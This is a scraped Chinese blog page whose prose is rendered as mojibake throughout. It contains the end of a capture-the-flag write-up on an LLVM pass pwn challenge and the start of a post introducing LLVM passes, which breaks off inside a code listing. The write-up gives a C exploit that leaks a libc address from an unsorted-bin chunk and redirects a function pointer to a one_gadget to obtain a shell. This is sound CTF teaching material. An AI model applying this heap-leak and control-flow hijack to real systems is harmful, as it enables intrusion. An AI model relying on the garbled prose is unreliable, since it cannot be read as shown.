<p>åœ¨stealkeyä¸­ï¼Œå‘ç°åœ¨è¯­å¥<code>byte_204100 = *key_chunk;</code>ï¼ˆkey_chunkå°±æ˜¯.soä¸­åç§»0x2040F8çš„ä½ç½®ï¼‰æ‰§è¡Œå‰ï¼Œä¹‹å‰saveåˆ›å»ºçš„chunkä¸­ä¿å­˜çš„æ˜¯ä¸€ä¸ªchunkçš„åœ°å€ï¼Œé‡Œé¢æœ‰saveå‡½æ•°çš„ä¸¤ä¸ªå®å‚çš„å€¼ã€‚ç„¶åstealkeyå°†è¿™ä¸ªchunkä¸­çš„å‰8å­—èŠ‚å–äº†å‡ºæ¥ä¿å­˜ã€‚</p>
<p><img src="4.png" alt="" /><br />
åé¢çš„fakekeyåŒæ ·éœ€è¦ä¼ å…¥ä¸€ä¸ªå‚æ•°ï¼Œå› æ­¤æœ‰ç¬¬å››ä¸ªæµ‹è¯•ä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span>* a, <span class="type">char</span>* b)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;123456&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">(<span class="type">char</span>* a)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;654321&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;abcdef&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">char</span>* a)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;fedcba&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;888888&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">	save(<span class="string">&quot;follow&quot;</span>, <span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">	stealkey();</span><br><span class="line">	fakekey(<span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	run();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç»è°ƒè¯•å‘ç°ï¼Œfakekeyä¸­å…³é”®æ“ä½œå‰é¢çš„åˆ¤æ–­é€šä¸è¿‡ï¼Œå¯¹å…³é”®åœ°å€æ²¡æœ‰ä»»ä½•å½±å“ï¼š</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v75 + <span class="number">16LL</span>) == <span class="number">13</span> )</span><br><span class="line">  SExtValue = llvm::APInt::<span class="built_in">getSExtValue</span>((llvm::APInt *)(*(_QWORD *)v75 + <span class="number">24LL</span>));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  SExtValue = <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure>
<p>ç”±äºgetSExtValueçš„å«ä¹‰æ˜¯get signed extended valueï¼Œè·å¾—æœ‰ç¬¦å·æ‰©å±•çš„æ•°ï¼Œæ¨æµ‹ä¸å‚æ•°æœ‰å…³ï¼Œæ—¢ç„¶æ˜¯æ•°ï¼ŒçŒœæµ‹å‚æ•°å¯¹ç±»å‹æœ‰è¦æ±‚ï¼šå¿…é¡»æ˜¯ä¸€ä¸ªæ•´æ•°ã€‚äºæ˜¯ä¿®æ”¹äº†fakekeyçš„å‚æ•°ç±»å‹ï¼Œå†æ¬¡å°è¯•ã€‚</p>
<p><img src="5.png" alt="" /><br />
æˆåŠŸé€šè¿‡åˆ¤æ–­æ¡ä»¶ã€‚éšåçš„getSExtValueå‡½æ•°ç¡®å®è¿”å›äº†fakekeyçš„ç¬¬ä¸€ä¸ªå‚æ•°å€¼ï¼Œå¹¶å°†å…³é”®åœ°å€å¤„çš„å€¼åŠ ä¸Šäº†è¿™ä¸ªå‚æ•°å€¼ã€‚éšåçš„runå‡½æ•°ä¸­å°±ä»¥è¯¥åœ°å€çš„å€¼ä½œä¸ºå‡½æ•°æŒ‡é’ˆè°ƒç”¨ã€‚ç”±æ­¤ï¼Œæµç¨‹åˆ†æåŸºæœ¬å®Œæˆï¼Œæ€è·¯é€æ¸æ¸…æ™°ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬å·²çŸ¥èƒ½å¤Ÿæ§åˆ¶ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆçš„å€¼ã€‚æœ¬é¢˜ç»™å‡ºçš„libcæ˜¯2.27ç‰ˆæœ¬ï¼Œå¯ä»¥ä½¿ç”¨one_gadgetå·¥å…·è·å–one_gadgetï¼Œåœ¨æ­¤ä¹‹åè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼šå¦‚ä½•è·å–libcçš„åŸºåœ°å€å¹¶ä¿å­˜åˆ°è¿™ä¸ªåœ°å€ä¸­ï¼Ÿè¦çŸ¥é“ï¼Œæˆ‘ä»¬èƒ½å¤Ÿä»»æ„ä¿®æ”¹key_chunkä¸­å€¼çš„å”¯äºŒçš„æ–¹æ³•æ˜¯ï¼šâ‘ é€šè¿‡saveå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¿®æ”¹ï¼›â‘¡é€šè¿‡fakekeyå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¿®æ”¹ã€‚ä½†æ˜¯åˆ«å¿˜äº†ï¼Œkey_chunkä¿å­˜çš„æ˜¯ä¸€ä¸ªchunkæŒ‡é’ˆï¼Œæ—¢ç„¶æ˜¯chunkå°±æœ‰å¯èƒ½åˆ†é…åˆ°åŸæ¥æ˜¯free chunkçš„chunkã€‚å¦‚æœè¿™åŸæ¥æ˜¯ä¸€ä¸ªunsorted bin chunkï¼Œé‚£ä¹ˆfdæŒ‡é’ˆå¤„ä¿å­˜çš„ä¸å°±æ­£æ˜¯main_arenaå¤„çš„åœ°å€å—ï¼Ÿå¦‚æœæˆ‘ä»¬å°†saveå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®ä¸ºâ€™\x00â€™ï¼Œç”±äºmemcpyå‡½æ•°æ‹·è´çš„é•¿åº¦æ˜¯æ ¹æ®å­—ç¬¦ä¸²çš„é•¿åº¦æ¥è®¡ç®—ï¼Œå› æ­¤saveå‡½æ•°æ­¤æ—¶å°±ä¸ä¼šè¦†ç›–è¿™é‡Œçš„åœ°å€å€¼ï¼Œæˆ‘ä»¬ä¹Ÿå°±èƒ½å¤Ÿè·å–åˆ°main_arenaä¸­çš„åœ°å€äº†ã€‚ä»¥æ­¤ä¸ºåŸºç¡€ä½¿ç”¨fakekeyå‡½æ•°åŠ ä¸Šä¸€ä¸ªå€¼è®©å®ƒæŒ‡å‘one_gadgetï¼Œè¿™ä¸å°±æˆäº†å—ï¼Ÿ</p>
<p><img src="6.png" alt="" /><br />
è¿™æ˜¯ç¨‹åºéå†åˆ°B4ckDo0rå‡½æ•°çš„æ—¶å€™çš„binsæƒ…å†µï¼Œå‘ç°0x20å¤§å°çš„tcache binä¸­æœ‰7ä¸ªchunkã€‚å¯ä»¥å…ˆå°†è¿™7ä¸ªåˆ†é…å‡ºæ¥ï¼Œç„¶åå°±å¯ä»¥é€šè¿‡åˆ‡å‰²unsorted binçš„æ–¹å¼æ‹¿åˆ°main_arenaçš„åœ°å€ã€‚</p>
<p>åœ¨ç»™å‡ºçš„libcä¸­ï¼Œmain_arenaçš„åç§»ä¸º0x3EBC40ï¼Œunsorted binçš„é“¾è¡¨å¤´åœ°å€ä¸º0x3EBCB0ã€‚ä»¥ä¸‹é¢çš„libcæ¥è®¡ç®—åç§»ã€‚å½“ç„¶ç”±äºç¬”è€…æ˜¯åœ¨ubuntu 20.04ä¸Šé¢è°ƒè¯•ï¼Œå› æ­¤ä½¿ç”¨æœ¬æœºçš„libcè®¡ç®—åç§»ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½åœ¨2.31çš„ç¯å¢ƒä¸‹æ‰“é€šã€‚</p>
<p><img src="7.png" alt="" /><br />
åœ¨ç¬”è€…çš„libcä¸­ï¼Œunsorted biné“¾è¡¨å¤´åœ°å€ä¸º0x1ECBF0ï¼Œone_gadgetå¦‚ä¸‹ï¼š<br />
<img src="8.png" alt="" /><br />
äºæ˜¯æœ‰ä¸‹é¢çš„è„šæœ¬ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span>* a, <span class="type">char</span>* b)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;123456&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">(<span class="type">char</span>* a)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;654321&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;abcdef&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">long</span> <span class="type">long</span> a)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;fedcba&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;888888&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">	save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	save(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	stealkey();</span><br><span class="line">	fakekey(<span class="number">-0x1090F2</span>);</span><br><span class="line">	run();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="9.png" alt="" /></p>
<p>æˆåŠŸgetshellã€‚</p>
<p>å†ç»è‰°éš¾å›°è‹¦ï¼Œè¿™é“é¢˜æ€»ç®—æ˜¯åšå‡ºæ¥äº†ï¼ˆè¿™ç¯‡æ–‡ç« æ˜¯ç¬”è€…èŠ±äº†ä¸‰å¤©æ—¶é—´æ‰å†™å‡ºæ¥çš„ï¼‰ã€‚é€šè¿‡æœ¬é¢˜æˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€äº›å…³é”®å‡½æ•°çš„ä½¿ç”¨å’Œä¸€äº›æ¡ä»¶æ§åˆ¶ä¿¡æ¯çš„è¯†åˆ«ï¼Œå°±å¦‚ä¸Šé¢æåˆ°çš„è°ƒç”¨ä»€ä¹ˆå‡½æ•°è¯´æ˜å¯èƒ½è¦è¿›è¡Œå‚æ•°ä¸ªæ•°çš„æ£€æŸ¥ï¼Œè°ƒç”¨ä¸Šé¢å‡½æ•°è¯´æ˜å¯èƒ½å¯¹å‚æ•°çš„ç±»å‹æœ‰è¦æ±‚ç­‰ç­‰ã€‚å½“ç„¶åšè¿™ç±»é¢˜ç›®ä¹Ÿæ˜¯å¯¹æˆ‘ä»¬é€†å‘C++ç¨‹åºèƒ½åŠ›çš„è®­ç»ƒï¼Œå€¼å¾—ä»”ç»†æ·±ç©¶ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-1/" class="post-title-link" itemprop="url">LLVM pass pwn å…¥é—¨ (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:35:40" itemprop="dateCreated datePublished" datetime="2023-02-28T22:35:40+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:43" itemprop="dateModified" datetime="2023-03-01T11:30:43+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ ç¬”è®°</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/llvm-pass-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">llvm pass pwn ç³»åˆ—</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>è¿‘å¹´æ¥ï¼Œpwné¢˜å‡ºçš„å¯è°“æ˜¯è¶Šæ¥è¶ŠèŠ±ï¼Œä»C++åˆ°kernelï¼Œå†åˆ°Rustã€Goã€Javaä¸€ä¼—è¯­è¨€ï¼Œè¿˜æœ‰LLVMã€‚å…¶ä¸­LLVMåœ¨å„ç§æ¯”èµ›ä¸­çš„å‡ºç°é¢‘ç‡è¶Šæ¥è¶Šé«˜ï¼Œå€¼å¾—å¼•èµ·é‡è§†ã€‚å€Ÿè¿™ç¯‡æ–‡ç« ï¼Œç¬”è€…å¼€å§‹LLVM passç±»pwné¢˜çš„å…¥é—¨ã€‚</p>
<p>é¦–å…ˆï¼Œæ—¢ç„¶è¦ç ”ç©¶LLVMï¼Œå°±è¦æ¸…æ¥šLLVMåˆ°åº•æ˜¯ä»€ä¹ˆã€‚</p>
<blockquote>
<p>å®ƒæ˜¯ä»¥C++ç¼–å†™çš„æ„æ¶ç¼–è¯‘å™¨çš„æ¡†æ¶ç³»ç»Ÿã€‚ç”¨äºä¼˜åŒ–ä»¥ä»»æ„ç¨‹åºè¯­è¨€ç¼–å†™çš„ç¨‹åºçš„ç¼–è¯‘æ—¶é—´(compile-time)ã€é“¾æ¥æ—¶é—´(link-time)ã€è¿è¡Œæ—¶é—´(run-time)ä»¥åŠç©ºé—²æ—¶é—´(idle-time)ï¼Œå¯¹å¼€å‘è€…ä¿æŒå¼€æ”¾ï¼Œå¹¶å…¼å®¹å·²æœ‰è„šæœ¬ã€‚ï¼ˆæ‘˜è‡ª<a target="_blank" rel="noopener" href="https://blog.csdn.net/yayaayaya123/article/details/83993041?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165728197316781818799638%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165728197316781818799638&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-83993041-null-null.142%5Ev32%5Econtrol,185%5Ev2%5Econtrol&amp;utm_term=LLVM&amp;spm=1018.2226.3001.4187">èµ„æ–™</a>ï¼‰</p>
</blockquote>
<p>LLVMåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å®é™…ä¸Šå‘æŒ¥äº†ä¸€ä¸ªç‰µçº¿æ­æ¡¥çš„ä½œç”¨ã€‚é«˜çº§è¯­è¨€å¤šç§å¤šæ ·ï¼Œä½†æ— è®ºæ˜¯å“ªä¸€ç§è¯­è¨€çš„ç¼–è¯‘å™¨ï¼Œéƒ½éœ€è¦å¯¹é«˜çº§è¯­è¨€ç¼–å†™çš„ä»£ç è¿›è¡Œè¯æ³•ä¸å¥æ³•åˆ†æï¼Œè¿™æ˜¯ç¼–è¯‘å™¨å‰ç«¯éƒ¨åˆ†çš„å·¥ä½œã€‚åœ¨åˆ†æå®Œæˆåï¼Œå‰ç«¯ä¼šè¾“å‡ºä¸€ä¸ªæŠ½è±¡è¯­æ³•æ ‘ASTï¼Œç”±LLVMè¿›è¡Œåˆ†æä¸ä¼˜åŒ–ï¼Œè½¬åŒ–ä¸ºä¸­é—´è¡¨ç¤ºIRã€‚å†ç”±ç¼–è¯‘å™¨åç«¯æ ¹æ®IRç”Ÿæˆå¯ä¾›æ‰§è¡Œçš„äºŒè¿›åˆ¶ä»£ç ã€‚</p>
<blockquote>
<p>è€Œpassæ˜¯ä¸€ç§ç¼–è¯‘å™¨å¼€å‘çš„ç»“æ„åŒ–æŠ€æœ¯ï¼Œç”¨äºå®Œæˆç¼–è¯‘å¯¹è±¡ï¼ˆå¦‚IRï¼‰çš„è½¬æ¢ã€åˆ†ææˆ–ä¼˜åŒ–ç­‰åŠŸèƒ½ã€‚passçš„æ‰§è¡Œå°±æ˜¯ç¼–è¯‘å™¨å¯¹ç¼–è¯‘å¯¹è±¡è¿›è¡Œè½¬æ¢ã€åˆ†æå’Œä¼˜åŒ–çš„è¿‡ç¨‹ï¼Œpassæ„å»ºäº†è¿™äº›è¿‡ç¨‹æ‰€éœ€è¦çš„åˆ†æç»“æœã€‚<br />
å¤§æ¦‚å°±æ˜¯è¯´ï¼ŒLLVMæä¾›äº†ä¸€ç§ä¸­é—´è¯­è¨€å½¢å¼ï¼Œä»¥åŠç¼–è¯‘é“¾æ¥è¿™ç§è¯­è¨€çš„åç«¯èƒ½åŠ›ï¼Œé‚£ä¹ˆå¯¹äºä¸€ä¸ªæ–°è¯­è¨€ï¼Œåªè¦å¼€å‘è€…èƒ½å¤Ÿå®ç°æ–°è¯­è¨€åˆ°IRçš„ç¼–è¯‘å™¨å‰ç«¯è®¾è®¡ï¼Œå°±å¯ä»¥äº«å—åˆ°ä»IRåˆ°å¯æ‰§è¡Œæ–‡ä»¶è¿™ä¹‹é—´çš„LLVMæä¾›çš„æ‰€æœ‰ä¼˜åŒ–ã€åˆ†ææˆ–è€…ä»£ç æ’æ¡©çš„èƒ½åŠ›ã€‚ï¼ˆæ‘˜è‡ª<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6yHWECP21Fn-P585wxRTJA">èµ„æ–™</a>ï¼‰</p>
</blockquote>
<p>ä¸‹é¢ï¼Œç¬”è€…ä½¿ç”¨Ubuntu 20.04ç³»ç»Ÿè¿›è¡Œç¬¬ä¸€ä¸ªLLVM passçš„ç¼–å†™æµ‹è¯•ã€‚</p>
<p>é¦–å…ˆå®‰è£…Clangï¼š<code>apt install clang</code>ï¼Œåœ¨Ubuntu 20.04å®‰è£…clangä¼šé™„å¸¦å®‰è£…llvm-9å’Œllvm-10ï¼Œç»è¿‡æµ‹è¯•å‘ç°ï¼Œåªæœ‰llvm-10èƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨ï¼Œç”¨llvm-9çš„åº“ç¼–è¯‘ä¼šæŠ¥é”™ã€‚</p>
<p>è¿™é‡Œå€Ÿ<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6yHWECP21Fn-P585wxRTJA">èµ„æ–™</a>ä¸­çš„æµ‹è¯•ä»£ç ç¼–å†™ï¼š</p>
<p>myFirstLLVMpass.cpp:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span><span class="comment">//å†™Passæ‰€å¿…é¡»çš„åº“</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span><span class="comment">//æ“ä½œå‡½æ•°æ‰€å¿…é¡»çš„åº“</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span><span class="comment">//æ‰“å°è¾“å‡ºæ‰€å¿…é¡»çš„åº“</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> &#123; <span class="comment">//å£°æ˜åŒ¿åç©ºé—´ï¼Œè¢«å£°æ˜çš„å†…å®¹ä»…åœ¨æ–‡ä»¶å†…éƒ¨å¯è§</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">    <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;<span class="comment">//é‡å†™runOnFunctionï¼Œä½¿å¾—æ¯æ¬¡éå†åˆ°ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™å°±è¾“å‡ºå‡½æ•°å</span></span><br><span class="line">      <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;<span class="comment">//æ³¨å†Œç±»Helloï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‘½ä»¤è¡Œå‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯åå­—</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="type">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;)</span></span>;</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢å°±æ˜¯LLVM passçš„C++ä»£ç äº†ã€‚æˆ‘ä»¬éœ€è¦ä¸€ä¸ªCè¯­è¨€æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸­çš„å†…å®¹æ— å…³ç´§è¦ï¼Œè¿™é‡Œç”¨ç¬”è€…åškernel pwné¢˜ä¸­çš„ä¸€ä¸ªæ–‡ä»¶ä¸ºä¾‹ï¼š</p>
<p>firstLLVMtest.c:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span 